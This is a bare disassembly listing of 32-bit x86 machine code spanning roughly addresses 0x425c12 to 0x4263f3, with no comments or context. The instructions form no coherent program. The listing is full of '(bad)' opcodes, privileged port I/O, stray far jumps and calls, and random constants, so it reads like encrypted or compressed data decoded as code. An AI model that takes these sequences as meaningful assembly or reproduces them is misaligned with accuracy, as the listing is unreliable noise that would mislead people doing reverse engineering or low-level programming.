  425c12:	mov    esp,0xf2def193
  425c17:	cmp    ebp,esi
  425c19:	fwait
  425c1a:	and    eax,0x7bca2243
  425c1f:	in     al,0x36
  425c21:	mov    ebp,0x260d479b
  425c26:	xchg   DWORD PTR [eax],esi
  425c28:	loope  0x425bde
  425c2a:	adc    ebp,DWORD PTR [edx+0x746cc479]
  425c30:	xchg   ebp,eax
  425c31:	cmp    BYTE PTR [edi+0x24b37537],dh
  425c37:	repz pop ebp
  425c39:	sub    eax,0x3b08a60f
  425c3e:	xchg   DWORD PTR [edx-0x2f693558],edi
  425c44:	mov    eax,0x9b20fcae
  425c4a:	xor    al,0x90
  425c4c:	mov    ebp,0x26c68cd1
  425c51:	sub    eax,0x54573d86
  425c56:	fist   WORD PTR [ebx+0x40]
  425c59:	and    BYTE PTR [eax-0x65dc942b],bh
  425c5f:	mov    WORD PTR [ebp-0x43782549],fs
  425c65:	(bad)  
  425c66:	jnp    0x425c63
  425c68:	pop    ebx
  425c69:	repz lahf 
  425c6b:	jnp    0x425ce9
  425c6d:	dec    ecx
  425c6e:	and    ecx,DWORD PTR [edx]
  425c70:	xlat   BYTE PTR ds:[ebx]
  425c71:	mov    esi,0xf859d1d
  425c76:	mul    BYTE PTR [edi+esi*1+0x3c]
  425c7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c7b:	sbb    DWORD PTR [eax-0x3c],edi
  425c7e:	pop    ebx
  425c7f:	iret   
  425c80:	cmp    DWORD PTR [ebx-0x71],edi
  425c83:	cmp    al,0x20
  425c85:	imul   edx,DWORD PTR [ebx],0x33badc9b
  425c8b:	sbb    dl,BYTE PTR [ebx]
  425c8d:	int    0x75
  425c8f:	cmp    eax,DWORD PTR [eax]
  425c91:	jnp    0x425cc4
  425c93:	iret   
  425c94:	pop    ecx
  425c95:	rcl    DWORD PTR [edx],0x4a
  425c98:	in     al,dx
  425c99:	lea    esp,[edi+0x59b57f74]
  425c9f:	ds scas eax,DWORD PTR es:[edi]
  425ca1:	daa    
  425ca2:	mov    al,ds:0x5463d4cb
  425ca7:	scas   eax,DWORD PTR es:[edi]
  425ca8:	pop    ds
  425ca9:	push   es
  425caa:	popa   
  425cab:	test   DWORD PTR [esi-0x71],ebp
  425cae:	aaa    
  425caf:	in     eax,dx
  425cb0:	mov    bh,0x7f
  425cb2:	jmp    0x425c85
  425cb4:	fmul   QWORD PTR [edx]
  425cb6:	das    
  425cb7:	cmova  ecx,ecx
  425cba:	inc    edi
  425cbb:	adc    al,0xc
  425cbd:	sbb    DWORD PTR [eax],eax
  425cbf:	pop    ebx
  425cc0:	out    dx,al
  425cc1:	out    0xf4,eax
  425cc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425cc4:	(bad)  
  425cc5:	sub    eax,0xbb6c4709
  425cca:	xchg   edi,eax
  425ccb:	psubd  mm6,QWORD PTR [edx]
  425cce:	push   edx
  425ccf:	xchg   edi,eax
  425cd0:	fdiv   DWORD PTR [edx+0x43]
  425cd3:	mov    bh,0xf
  425cd5:	das    
  425cd6:	loopne 0x425d50
  425cd8:	dec    ax
  425cda:	sub    eax,0x83c2c053
  425cdf:	iret   
  425ce0:	iret   
  425ce1:	stc    
  425ce2:	sbb    DWORD PTR [esp+esi*2+0x5440f20f],edx
  425ce9:	retf   
  425cea:	fistp  QWORD PTR [ecx]
  425cec:	loope  0x425d25
  425cee:	mov    eax,ds:0xd691d204
  425cf3:	lock xor cl,BYTE PTR [eax]
  425cf6:	jno    0x425c97
  425cf8:	dec    edx
  425cf9:	pop    ds
  425cfa:	dec    esp
  425cfb:	bnd jp 0x425d2c
  425cfe:	aam    0xc3
  425d00:	icebp  
  425d01:	daa    
  425d02:	sub    eax,0xe8763f8
  425d07:	mov    edi,0xd7293175
  425d0c:	retf   0x981c
  425d0f:	fidivr WORD PTR fs:[ecx]
  425d12:	xor    eax,0xfaaa211b
  425d17:	fsub   st(5),st
  425d19:	or     edx,DWORD PTR [esi-0x5b]
  425d1c:	ret    0x5d9
  425d1f:	mov    eax,ds:0x122060de
  425d24:	sub    BYTE PTR [ebp+ebp*1+0x46],bh
  425d28:	jmp    0xe564:0xe7c1a00c
  425d2f:	retf   0xb385
  425d32:	dec    ebp
  425d33:	push   esp
  425d34:	pop    eax
  425d35:	push   ebp
  425d36:	fidiv  WORD PTR [esp+ebx*4-0x111afb96]
  425d3d:	in     eax,0x18
  425d3f:	push   esi
  425d40:	ja     0x425d89
  425d42:	pop    ecx
  425d43:	push   0xfea7abb7
  425d48:	push   es
  425d49:	je     0x425db0
  425d4b:	mov    al,ds:0xef1c4e06
  425d50:	outs   dx,DWORD PTR ds:[esi]
  425d51:	daa    
  425d52:	pop    ebx
  425d53:	sub    BYTE PTR [eax+0x5b],ah
  425d56:	pop    ebp
  425d57:	rcr    DWORD PTR [ebx+0x70126b04],1
  425d5d:	sub    ch,ah
  425d5f:	jb     0x425dda
  425d61:	aam    0x10
  425d63:	jnp    0x425d13
  425d65:	clc    
  425d66:	loop   0x425d60
  425d68:	pop    edi
  425d69:	icebp  
  425d6a:	inc    edx
  425d6b:	mov    ebp,0x12ccd5e4
  425d70:	mov    dl,0xbb
  425d72:	aad    0x62
  425d74:	aad    0xdc
  425d76:	test   DWORD PTR [edx],eax
  425d78:	das    
  425d79:	xor    edx,DWORD PTR [edx]
  425d7b:	push   es
  425d7c:	in     eax,0x54
  425d7e:	xor    bl,dh
  425d80:	pusha  
  425d81:	jmp    0x425d51
  425d83:	scas   al,BYTE PTR es:[edi]
  425d84:	sbb    ch,BYTE PTR [edi]
  425d86:	xchg   ebp,eax
  425d87:	shl    edx,1
  425d89:	xor    eax,0x5c21975
  425d8e:	xlat   BYTE PTR ds:[ebx]
  425d8f:	or     al,0xdb
  425d91:	call   0x54231cd6
  425d96:	jg     0x425dfb
  425d98:	jne    0x425df7
  425d9a:	sar    DWORD PTR [edi],cl
  425d9c:	and    al,0xde
  425d9e:	gs iret 
  425da0:	imul   ebx,DWORD PTR [edx+0x76],0xffffffe9
  425da4:	pop    ss
  425da5:	ret    0x1582
  425da8:	xchg   ebp,eax
  425da9:	jbe    0x425d53
  425dab:	xor    eax,edx
  425dad:	push   ecx
  425dae:	in     al,0xec
  425db0:	xchg   DWORD PTR ds:0x966ac28,esi
  425db6:	into   
  425db7:	sub    eax,ebp
  425db9:	jmp    0x2b34bd04
  425dbe:	mov    eax,0x3f4f9c33
  425dc3:	scas   eax,DWORD PTR es:[edi]
  425dc4:	cs inc eax
  425dc6:	stos   BYTE PTR es:[edi],al
  425dc7:	out    dx,eax
  425dc8:	test   DWORD PTR [ecx-0x7a701823],0xcba811cc
  425dd2:	mov    esi,0x3e25270d
  425dd7:	ins    DWORD PTR es:[edi],dx
  425dd8:	xchg   ebx,eax
  425dd9:	test   al,0x20
  425ddb:	pop    ss
  425ddc:	addr16 xchg ecx,eax
  425dde:	outs   dx,BYTE PTR ds:[esi]
  425ddf:	iret   
  425de0:	pop    ebp
  425de1:	pop    es
  425de2:	les    edi,FWORD PTR [edx-0x6b0d4550]
  425de8:	jge    0x425dac
  425dea:	enter  0x8081,0x30
  425dee:	stos   DWORD PTR es:[edi],eax
  425def:	lds    esi,FWORD PTR [edx+eax*2]
  425df2:	jg     0x425e53
  425df4:	sub    al,0xcb
  425df6:	inc    ebx
  425df7:	call   0x49ec:0x79ae9c31
  425dfe:	sub    DWORD PTR [eax-0x3],ebx
  425e01:	call   0x8483f709
  425e06:	outs   dx,BYTE PTR ds:[esi]
  425e07:	test   DWORD PTR [edi+eax*1-0x28882586],esi
  425e0e:	stos   DWORD PTR es:[edi],eax
  425e0f:	pop    eax
  425e10:	pop    esp
  425e11:	mov    ds:0xc40024e9,eax
  425e16:	mov    al,ds:0x736bbe0a
  425e1b:	sbb    BYTE PTR [eax],ah
  425e1d:	add    eax,0x7dc30890
  425e22:	shl    esp,cl
  425e24:	scas   eax,DWORD PTR es:[edi]
  425e25:	mov    edi,es
  425e27:	pop    ds
  425e28:	out    dx,al
  425e29:	out    0x8b,eax
  425e2b:	(bad)  
  425e2c:	sbb    al,0xf0
  425e2e:	js     0x425e06
  425e30:	inc    ebp
  425e31:	push   esi
  425e32:	sahf   
  425e33:	adc    al,0xc9
  425e35:	adc    bl,BYTE PTR [edi+0x66]
  425e38:	es out dx,eax
  425e3a:	les    ebx,FWORD PTR [edx-0xead92f]
  425e40:	call   0x0:0xba0918
  425e47:	add    BYTE PTR [eax],al
  425e49:	add    BYTE PTR [edx+0x44],al
  425e4c:	inc    ebp
  425e4d:	pop    eax
  425e4e:	inc    edi
  425e4f:	pop    ecx
  425e50:	pop    edi
  425e51:	pop    esi
  425e52:	mov    bl,0x51
  425e54:	push   eax
  425e55:	mov    cl,0x86
  425e57:	or     al,0xb7
  425e59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e5a:	bnd jmp 0x425e5e
  425e5d:	add    BYTE PTR [edx+0x77000006],al
  425e63:	xchg   DWORD PTR [esi-0x3],edx
  425e66:	std    
  425e67:	jmp    0x8414f5b6
  425e6c:	addr16 nop
  425e6e:	pop    esp
  425e6f:	inc    edi
  425e70:	inc    ebx
  425e71:	mov    ebp,0xee542b97
  425e76:	inc    edi
  425e77:	outs   dx,DWORD PTR fs:[esi]
  425e79:	sbb    DWORD PTR [esi+0x25],ecx
  425e7c:	popa   
  425e7d:	mov    bl,0x34
  425e7f:	dec    esp
  425e80:	shl    DWORD PTR [esi+0x67],0xba
  425e84:	inc    ecx
  425e85:	lods   al,BYTE PTR ds:[esi]
  425e86:	sub    eax,0xb3663150
  425e8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e8c:	cmp    al,BYTE PTR [ebp-0x6d]
  425e8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e90:	jp     0x425e50
  425e92:	adc    eax,DWORD PTR [ebp+0x3cdaee54]
  425e98:	jp     0x425e60
  425e9a:	push   ds
  425e9b:	(bad)  
  425e9c:	aad    0xd7
  425e9e:	retf   0x8edf
  425ea1:	jmp    0xf590:0x6a88009
  425ea8:	test   BYTE PTR [eax-0x5f],dh
  425eab:	fs pusha 
  425ead:	clc    
  425eae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425eaf:	or     BYTE PTR [esi-0x293539f7],dh
  425eb5:	sub    DWORD PTR [esi-0x3e],ecx
  425eb8:	and    eax,0xe2347546
  425ebd:	sti    
  425ebe:	inc    ebp
  425ebf:	imul   edi,DWORD PTR [esp+edi*4+0x651a5004],0x595a526e
  425eca:	cmp    edx,esi
  425ecc:	in     eax,0x0
  425ece:	xchg   ecx,eax
  425ecf:	cmp    BYTE PTR [eax-0x40],bl
  425ed2:	(bad)  
  425ed3:	out    dx,al
  425ed4:	popf   
  425ed5:	push   cs
  425ed6:	into   
  425ed7:	mul    DWORD PTR [ebx]
  425ed9:	jmp    ecx
  425edb:	xchg   edx,eax
  425edc:	fs mov al,0xb2
  425edf:	push   DWORD PTR [ebx+0x67f67988]
  425ee5:	jge    0x425f1b
  425ee7:	mov    al,BYTE PTR [edx-0x76baf5f3]
  425eed:	sti    
  425eee:	pop    esi
  425eef:	mov    esp,0x7eaa9aa7
  425ef4:	or     eax,0xa23f8dda
  425ef9:	jns    0x425f77
  425efb:	mov    bh,0x66
  425efd:	imul   edi,DWORD PTR [ebp-0x50],0xffffffae
  425f01:	in     eax,dx
  425f02:	or     eax,eax
  425f04:	mov    eax,0x61136497
  425f09:	lods   al,BYTE PTR ds:[esi]
  425f0a:	jae    0x425e98
  425f0c:	mov    cl,0xa1
  425f0e:	xor    DWORD PTR [edx-0x2980edee],edi
  425f14:	imul   esi,eax,0x8ceb45aa
  425f1a:	ja     0x425f07
  425f1c:	push   eax
  425f1d:	mov    ch,0x94
  425f1f:	popa   
  425f20:	jb     0x425f0a
  425f22:	shl    ah,cl
  425f24:	sti    
  425f25:	mov    BYTE PTR [esi],al
  425f27:	sub    DWORD PTR [ebx-0x23138d1e],eax
  425f2d:	scas   eax,DWORD PTR es:[edi]
  425f2e:	data16 or al,0xe7
  425f31:	push   ecx
  425f32:	cmp    al,0xde
  425f34:	int    0xea
  425f36:	pop    es
  425f37:	xchg   ebx,eax
  425f38:	mov    eax,ds:0x2b704c15
  425f3d:	pop    ds
  425f3e:	sti    
  425f3f:	(bad)  
  425f40:	pop    ds
  425f41:	aad    0x8b
  425f43:	add    bh,0x35
  425f46:	loope  0x425f8f
  425f48:	popa   
  425f49:	shl    BYTE PTR ds:0xd3262f71,1
  425f4f:	push   ebx
  425f50:	mov    esi,0xd4b7aedd
  425f55:	jmp    0xb7050cc
  425f5a:	iret   
  425f5b:	aam    0x5c
  425f5d:	(bad)  
  425f5e:	shr    DWORD PTR ds:0xacb3bd82,0xc8
  425f65:	adc    ah,BYTE PTR gs:[ebp+0x6f]
  425f69:	mov    cl,0x89
  425f6b:	jmp    0x30c1:0x466e760d
  425f72:	mov    ch,0xb0
  425f74:	mov    ch,dl
  425f76:	inc    ebx
  425f77:	stc    
  425f78:	xor    eax,0x92c1349c
  425f7d:	inc    edx
  425f7e:	and    eax,0xfe3545dc
  425f83:	add    ebx,DWORD PTR [esp+edx*8]
  425f86:	icebp  
  425f87:	xchg   esp,eax
  425f88:	lahf   
  425f89:	mov    esp,0x831c844a
  425f8e:	cmc    
  425f8f:	mov    edx,0x840a374b
  425f94:	(bad)  
  425f96:	push   ecx
  425f97:	fcomip st,st(7)
  425f99:	pusha  
  425f9a:	out    dx,al
  425f9b:	jae    0x425fa1
  425f9d:	imul   ebp,DWORD PTR [ebx+0x31658d5f],0x23
  425fa4:	div    DWORD PTR [ebx+esi*1-0x65]
  425fa8:	lock xlat BYTE PTR ds:[ebx]
  425faa:	sbb    DWORD PTR [ebp-0x48],ecx
  425fad:	sahf   
  425fae:	repz pop esp
  425fb0:	stc    
  425fb1:	std    
  425fb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425fb3:	cwde   
  425fb4:	fsubr  QWORD PTR [ebx]
  425fb6:	pop    esp
  425fb7:	push   ss
  425fb8:	push   cs
  425fb9:	pop    eax
  425fba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425fbb:	inc    ecx
  425fbc:	dec    BYTE PTR [ecx-0x538ffbdd]
  425fc2:	inc    edx
  425fc3:	data16 fldcw WORD PTR [ebp+eiz*2-0xaabcb9e]
  425fcb:	pop    ebp
  425fcc:	mov    edx,0x82f87371
  425fd1:	ins    BYTE PTR es:[edi],dx
  425fd2:	jne    0x425f69
  425fd4:	pop    edx
  425fd5:	jbe    0x425f87
  425fd7:	clc    
  425fd8:	jb     0x425ff5
  425fda:	pop    ebx
  425fdb:	imul   esi,DWORD PTR [esi-0x5efe4df1],0x11e08eda
  425fe5:	mov    bl,0xa9
  425fe7:	aaa    
  425fe8:	mov    ebp,0xe7839f2e
  425fed:	ss cli 
  425fef:	mov    DWORD PTR [eax+eax*1],ebp
  425ff2:	add    al,0xec
  425ff4:	jb     0x425fc4
  425ff6:	stos   DWORD PTR es:[edi],eax
  425ff7:	sub    dl,dh
  425ff9:	mov    al,ds:0xed78da27
  425ffe:	scas   eax,DWORD PTR es:[edi]
  425fff:	inc    edi
  426000:	dec    ecx
  426001:	sub    BYTE PTR [edx+0x31e4e6ee],ch
  426007:	inc    esi
  426008:	stc    
  426009:	sbb    BYTE PTR es:[ebp-0x39140f69],0x19
  426011:	mov    edi,0x2d20f520
  426016:	scas   eax,DWORD PTR es:[edi]
  426017:	bound  ebp,QWORD PTR [edi]
  426019:	dec    ebp
  42601a:	xor    BYTE PTR [esi-0x11],bh
  42601d:	in     al,dx
  42601e:	xchg   ebx,eax
  42601f:	dec    eax
  426020:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426021:	mov    DWORD PTR [edi],esi
  426023:	sub    DWORD PTR [edi-0x39a3b0f8],eax
  426029:	sub    DWORD PTR [esi+edi*2],ebx
  42602c:	call   0x5e4f:0xce400bc4
  426033:	jmp    0x426003
  426035:	sar    DWORD PTR [ecx+0x6b0e79e8],1
  42603b:	xchg   ecx,eax
  42603c:	or     DWORD PTR [ecx+esi*4],0x6b
  426040:	aaa    
  426041:	jmp    0xfe79:0x31d9ddb
  426048:	in     eax,dx
  426049:	adc    BYTE PTR [ebx+eiz*8-0x23227ac0],ch
  426050:	sbb    eax,0x5680a685
  426055:	mov    ecx,0x692895d2
  42605a:	mov    eax,ds:0x60dad93
  42605f:	loope  0x4260df
  426061:	adc    ebx,DWORD PTR [eax]
  426063:	syscall 
  426065:	xlat   BYTE PTR ds:[ebx]
  426066:	data16 fstp TBYTE PTR [ebx+0x2]
  42606a:	xor    edx,edi
  42606c:	adc    al,0xfc
  42606e:	push   edi
  42606f:	jmp    0x4260e2
  426071:	jmp    0x1b4a:0x6768fe36
  426078:	pusha  
  426079:	aaa    
  42607a:	xor    DWORD PTR [eax+ebp*4],ebp
  42607d:	sti    
  42607e:	ror    edi,cl
  426080:	push   ebp
  426081:	push   ebx
  426082:	pop    ecx
  426083:	adc    eax,0x2f23f11
  426088:	jo     0x426011
  42608a:	popa   
  42608b:	shl    BYTE PTR [ecx],0xaa
  42608e:	mov    ebp,0x1af7db21
  426093:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426094:	pop    ecx
  426095:	xchg   ecx,eax
  426096:	mov    bh,0xf
  426098:	xchg   edi,eax
  426099:	add    al,0x49
  42609b:	shl    ch,cl
  42609d:	ret    0x8d16
  4260a0:	sahf   
  4260a1:	(bad)
  4260a4:	int3   
  4260a5:	ret    0x2742
  4260a8:	es (bad) 
  4260ab:	pop    ebx
  4260ac:	sbb    eax,0xb5cce606
  4260b1:	pop    eax
  4260b2:	push   es
  4260b3:	rol    DWORD PTR [ebx+0x4841a5fa],1
  4260b9:	std    
  4260ba:	sbb    BYTE PTR [ebx-0xb],0xe6
  4260be:	add    ebx,DWORD PTR [ecx-0x63]
  4260c1:	xor    al,0x9c
  4260c3:	xchg   ebx,eax
  4260c4:	or     dh,al
  4260c6:	arpl   WORD PTR [edx],bp
  4260c8:	fisub  DWORD PTR [esi]
  4260ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260cb:	sub    al,0xcc
  4260cd:	mov    ds:0x442b0778,eax
  4260d2:	mov    dh,0xde
  4260d4:	push   edx
  4260d5:	imul   eax,DWORD PTR [ebp-0x4348bf9d],0x5e5dcb0
  4260df:	mov    edx,0x2eddde31
  4260e4:	in     al,0x43
  4260e6:	icebp  
  4260e7:	push   edx
  4260e8:	jmp    0xef0:0xb36d84d9
  4260ef:	push   edx
  4260f0:	jecxz  0x426155
  4260f2:	mov    ecx,0xebfbf3b6
  4260f7:	cmp    esi,DWORD PTR [eax-0x22b501d7]
  4260fd:	xor    eax,0x288f7ea7
  426102:	pop    ds
  426103:	pop    esi
  426104:	mov    ch,0x15
  426106:	jmp    0x8b905965
  42610b:	clc    
  42610c:	cmp    DWORD PTR [ecx+0x2c4122d2],ebx
  426112:	jmp    0xecfc:0x1d68c96c
  426119:	inc    esi
  42611a:	mov    bh,BYTE PTR [eax]
  42611c:	mov    al,ds:0x9a063969
  426121:	adc    eax,0x1c00e660
  426126:	xlat   BYTE PTR ds:[ebx]
  426127:	dec    edx
  426128:	loop   0x4260c1
  42612a:	int    0x19
  42612c:	jno    0x426122
  42612e:	div    ecx
  426130:	xlat   BYTE PTR ds:[ebx]
  426131:	jb     0x4261a7
  426133:	repnz mov al,ds:0x9ece2a95
  426139:	jnp    0x42619e
  42613b:	or     eax,DWORD PTR [ecx]
  42613d:	mov    ds:0xfcf0c9f7,al
  426142:	popf   
  426143:	inc    esi
  426144:	and    BYTE PTR [ebx-0x6caeafba],dl
  42614a:	dec    DWORD PTR [edx+ebx*1-0x3d61a655]
  426151:	icebp  
  426152:	sbb    eax,0xc0887a7
  426157:	inc    esi
  426158:	mov    esi,0x6347465e
  42615d:	mul    al
  42615f:	mov    ds:0x67d947c7,eax
  426164:	fwait
  426165:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426166:	(bad)  
  426167:	fmul   QWORD PTR [ebp+0x27]
  42616a:	popa   
  42616b:	mov    ah,0x3a
  42616d:	fisubr DWORD PTR [edx+0x203d80cc]
  426173:	or     BYTE PTR [esi+0x7454175e],ah
  426179:	add    bh,dl
  42617b:	adc    edi,0xafb159ec
  426181:	(bad)  
  426182:	mov    ecx,0x5ce54214
  426187:	rol    ebx,0x84
  42618a:	shr    cl,1
  42618c:	adc    esi,edx
  42618e:	test   al,0x5
  426190:	ss mov bh,0xbd
  426193:	xlat   BYTE PTR ds:[ebx]
  426194:	jge    0x426144
  426196:	cmp    ecx,edx
  426198:	add    al,0xc4
  42619a:	out    dx,al
  42619b:	add    al,0xfa
  42619d:	(bad)  
  42619e:	cmc    
  42619f:	call   0xc420:0x3e97939a
  4261a6:	stos   DWORD PTR es:[edi],eax
  4261a7:	cmp    bl,bl
  4261a9:	push   eax
  4261aa:	sbb    DWORD PTR [eax+0x40843451],edx
  4261b0:	or     eax,0xd6b1571
  4261b5:	rol    DWORD PTR ds:0x8de8ced3,cl
  4261bb:	(bad)
  4261be:	mov    ?,WORD PTR [ebp+0x3c]
  4261c1:	jmp    DWORD PTR [ecx]
  4261c3:	sub    BYTE PTR [esi+0x41],0x64
  4261c7:	add    dl,ch
  4261c9:	pop    ebp
  4261ca:	add    DWORD PTR [esi],0x76eed2de
  4261d0:	and    eax,0x586356ee
  4261d5:	das    
  4261d6:	shr    DWORD PTR [esi-0x64],cl
  4261d9:	push   ss
  4261da:	add    DWORD PTR [ebp-0x6d],eax
  4261dd:	push   ecx
  4261de:	and    DWORD PTR [ebx],edi
  4261e0:	enter  0x42ae,0x11
  4261e4:	sub    al,0xe9
  4261e6:	inc    esp
  4261e7:	jnp    0x426252
  4261e9:	push   cs
  4261ea:	pop    ds
  4261eb:	retf   
  4261ec:	inc    ebx
  4261ed:	sbb    al,0x92
  4261ef:	xor    BYTE PTR [edx-0x4efcea55],dh
  4261f5:	xchg   BYTE PTR [ebp-0x51],al
  4261f8:	call   0x2809a5e
  4261fd:	lods   al,BYTE PTR ds:[esi]
  4261fe:	jnp    0x42619e
  426200:	gs in  eax,dx
  426202:	mov    esp,0xcd51f2f4
  426207:	mov    esi,0x27b7fa01
  42620c:	(bad)  
  42620d:	sahf   
  42620e:	iret   
  42620f:	mul    BYTE PTR [ebx+0x7cdd0ac3]
  426215:	mov    ?,WORD PTR [edi+0x39]
  426218:	test   al,0xf8
  42621a:	pop    edx
  42621b:	jl     0x426269
  42621d:	jg     0x4261b5
  42621f:	je     0x426209
  426221:	fcomp  QWORD PTR [ebx+edx*2]
  426224:	mov    ah,0xa7
  426226:	(bad)  
  426227:	cmp    dl,BYTE PTR [edi]
  426229:	mov    eax,0x7540d089
  42622e:	dec    DWORD PTR [esi+0x11]
  426231:	(bad)  
  426232:	sahf   
  426233:	mov    esi,0x35a0ed87
  426238:	xchg   ecx,eax
  426239:	das    
  42623a:	enter  0xc4b6,0x1e
  42623e:	clc    
  42623f:	push   ecx
  426240:	stos   BYTE PTR es:[edi],al
  426241:	inc    ebx
  426242:	inc    ebp
  426243:	dec    esi
  426244:	not    DWORD PTR [edi-0x600d53c4]
  42624a:	mov    al,0xdb
  42624c:	xchg   ebx,eax
  42624d:	xor    al,0xda
  42624f:	xchg   esp,eax
  426250:	ror    BYTE PTR fs:[edx-0x45],0xf1
  426255:	dec    ecx
  426256:	scas   eax,DWORD PTR es:[edi]
  426257:	adc    BYTE PTR [eax-0x20],ah
  42625a:	mov    edi,0x77bb80d
  42625f:	jmp    0x43b8:0xc4df29a8
  426266:	xchg   edx,eax
  426267:	adc    al,0x15
  426269:	test   BYTE PTR [ebx-0x3ad71d82],dl
  42626f:	mov    DWORD PTR [esi+0x7d49653a],ebx
  426275:	out    0x6e,al
  426277:	leave  
  426278:	adc    esi,DWORD PTR [ebp-0x2e890219]
  42627e:	sub    dh,bl
  426280:	mov    WORD PTR ds:0xc839caf8,es
  426286:	stos   DWORD PTR es:[edi],eax
  426287:	jb     0x42622c
  426289:	retf   0x6cc3
  42628c:	and    edx,DWORD PTR [eax+0x2c4a516a]
  426292:	push   0x2027be45
  426297:	lds    eax,FWORD PTR [ebx]
  426299:	inc    esi
  42629a:	int    0x3d
  42629c:	cmp    al,0x8e
  42629f:	xor    dh,BYTE PTR [ecx]
  4262a1:	clc    
  4262a2:	mov    al,0x63
  4262a4:	(bad)  
  4262a5:	ins    DWORD PTR es:[edi],dx
  4262a6:	xchg   edi,eax
  4262a7:	test   BYTE PTR [esi+0x7354fc8a],bh
  4262ad:	dec    ecx
  4262ae:	stc    
  4262af:	retf   
  4262b0:	inc    esi
  4262b1:	icebp  
  4262b2:	sbb    dl,al
  4262b4:	adc    esi,eax
  4262b6:	sbb    eax,0x5aa6d32f
  4262bb:	cmp    DWORD PTR [edi-0x1f],edx
  4262be:	pop    ss
  4262bf:	inc    ebp
  4262c0:	test   al,0x54
  4262c2:	js     0x4262e6
  4262c4:	cli    
  4262c5:	and    DWORD PTR [edi],edx
  4262c7:	nop
  4262c8:	push   ds
  4262c9:	mov    edi,0xdc60695d
  4262ce:	in     eax,dx
  4262cf:	mov    ebx,0x3d17f3df
  4262d4:	cmp    BYTE PTR [ebx],dh
  4262d6:	and    bh,dh
  4262d8:	arpl   di,dx
  4262da:	adc    al,0x38
  4262dc:	and    al,0x79
  4262de:	test   dl,bl
  4262e0:	xor    al,0x30
  4262e2:	jmp    0x7261cbc6
  4262e7:	sub    edx,eax
  4262e9:	arpl   WORD PTR [edi+0x3e146f40],ax
  4262ef:	je     0x4262f0
  4262f1:	lahf   
  4262f2:	sub    ebx,ecx
  4262f4:	int3   
  4262f5:	xor    BYTE PTR [esi],al
  4262f7:	jmp    FWORD PTR [edi+edi*4]
  4262fa:	test   BYTE PTR [ebx+0x58],al
  4262fd:	ss push es
  4262ff:	sub    esi,ecx
  426301:	leave  
  426302:	lods   eax,DWORD PTR ds:[esi]
  426303:	xor    edi,ebp
  426305:	add    eax,0xdabba73f
  42630a:	pop    ds
  42630b:	mov    cl,BYTE PTR [eax-0x4c]
  42630e:	mov    edx,0x370d8c27
  426313:	or     esi,DWORD PTR ds:0xa329be8
  426319:	push   ss
  42631a:	fsub   QWORD PTR [eax+0x7314a30d]
  426320:	push   0xffffffa1
  426322:	sbb    DWORD PTR [ecx-0x6b],ebx
  426325:	push   eax
  426326:	(bad)  
  426327:	adc    DWORD PTR [edi],edi
  426329:	mov    ebp,0xf584cc37
  42632e:	push   edi
  42632f:	mov    ecx,ebp
  426331:	push   ebp
  426332:	pop    edx
  426333:	je     0x426339
  426335:	loope  0x426314
  426337:	pushf  
  426338:	test   dl,0xa7
  42633b:	push   0xffffffe7
  42633d:	les    ebx,FWORD PTR [esi+0x2d]
  426340:	iret   
  426341:	dec    eax
  426342:	and    BYTE PTR [esi],ch
  426344:	xlat   BYTE PTR ds:[ebx]
  426345:	xchg   DWORD PTR [ebx-0x161c84f4],esi
  42634b:	clc    
  42634c:	out    dx,al
  42634d:	mov    esp,0xcadb9b78
  426352:	jmp    0xec8c:0xa6677be1
  426359:	repnz cmp DWORD PTR [ebx+0x205703a6],esp
  426360:	mov    bl,0xbd
  426362:	fnstenv [esi-0x35]
  426365:	xchg   ebp,esi
  426367:	jmp    0x4263bd
  426369:	xor    BYTE PTR [ebp+0x72317ce4],dh
  42636f:	mov    edi,0xb6d93c42
  426374:	stos   BYTE PTR es:[edi],al
  426375:	int    0xe1
  426377:	cli    
  426378:	fnsave [edx+0x2af72a6]
  42637e:	cmc    
  42637f:	js     0x4263e0
  426381:	mov    es,WORD PTR [edi+eiz*1-0x2b]
  426385:	in     al,dx
  426386:	imul   eax,DWORD PTR [ecx+0x4a47dd28],0x4c
  42638d:	and    cl,BYTE PTR [edi]
  42638f:	shr    DWORD PTR [edi+0x4e1dcc92],0x42
  426396:	popf   
  426397:	in     al,dx
  426398:	add    al,0x9d
  42639a:	inc    ebp
  42639b:	clc    
  42639c:	xor    eax,0x2d96c2d5
  4263a1:	mov    edi,0x1498d9ff
  4263a6:	sti    
  4263a7:	push   es
  4263a8:	leave  
  4263a9:	jns    0x426387
  4263ab:	scas   al,BYTE PTR es:[edi]
  4263ac:	mov    dl,0x8f
  4263ae:	push   esi
  4263af:	iret   
  4263b0:	cs hlt 
  4263b2:	mov    ds:0xdd90a8af,eax
  4263b7:	dec    ebx
  4263b8:	popa   
  4263b9:	scas   eax,DWORD PTR es:[edi]
  4263ba:	inc    edx
  4263bb:	push   esp
  4263bc:	popa   
  4263bd:	int3   
  4263be:	mov    cl,0xe6
  4263c0:	(bad)  
  4263c1:	jmp    0xe5dfb7f6
  4263c6:	pop    edx
  4263c7:	pop    es
  4263c8:	adc    eax,DWORD PTR [edi]
  4263ca:	push   edx
  4263cb:	jmp    0x426386
  4263cd:	jnp    0x42643d
  4263cf:	aaa    
  4263d0:	cmp    cl,cl
  4263d2:	adc    al,0xe3
  4263d4:	xor    al,0xfa
  4263d6:	xor    ebx,eax
  4263d8:	icebp  
  4263d9:	imul   edi,DWORD PTR [ecx],0xffffffa7
  4263dc:	(bad)  
  4263de:	in     eax,0x6c
  4263e0:	sub    al,0x76
  4263e2:	daa    
  4263e3:	dec    edx
  4263e4:	nop
  4263e5:	adc    ecx,DWORD PTR [eax+0x2d]
  4263e8:	xor    DWORD PTR [esi],ebx
  4263ea:	xchg   esp,eax
  4263eb:	or     BYTE PTR cs:[edi],al
  4263ee:	in     eax,dx
  4263ef:	mov    dl,0x31
  4263f1:	mov    BYTE PTR [eax],dl
  4263f3:	popf   
